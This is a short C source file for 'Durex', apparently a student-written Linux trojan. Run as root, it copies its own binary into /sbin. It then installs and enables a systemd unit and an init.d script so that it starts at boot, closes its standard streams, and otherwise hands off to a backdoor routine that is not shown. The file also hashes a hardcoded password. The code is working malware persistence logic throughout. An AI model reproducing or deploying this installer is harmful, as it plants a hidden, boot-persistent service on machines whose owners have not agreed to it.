#include "durex.h"

int		main(int ac, char **av, char **envp)
{
	char buf[255];
	char buf2[255];
	_md5((uint8_t*)"root");
	memset(&buf, 0, 255);
	if(geteuid() != 0)
		exit(1);
	readlink("/proc/self/exe", buf, 255);
	snprintf(buf2, 255, "cp %s /sbin/Durex && chmod u+x /sbin/Durex", buf);
	if (strcmp(buf, "/sbin/Durex") && strcmp(buf, "/usr/sbin/Durex"))
	{
		printf("maabou-h\n");
		close(0);
		close(1);
		close(2);
		if (system(buf2) != 0)
			exit(1);
		if (system("cp ./Durex.service /etc/systemd/system/Durex.service && chmod u+x /etc/systemd/system/Durex.service") != 0)
			exit(1);
		if (system("cp ./Durex.init /etc/init.d/Durex && chmod u+x /etc/init.d/Durex") != 0)
			exit(1);
		system("systemctl -q daemon-reload");
		system("systemctl -q enable Durex");
		system("service Durex start");
		exit(0);
	}
	else
		_rundurex(envp);
}
